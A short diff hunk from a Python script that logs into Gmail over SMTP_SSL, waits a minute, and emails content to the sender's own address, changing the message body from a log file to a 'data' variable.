@@ -51,7 +51,7 @@ def main():
     with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server: 
         server.login("my@gmail.com", password) 
         time.sleep(60)
-        server.sendmail("my@gmail.com", "my@gmail.com", log_file)
+        server.sendmail("my@gmail.com", "my@gmail.com", data)
 
 
 if __name__ == "__main__":
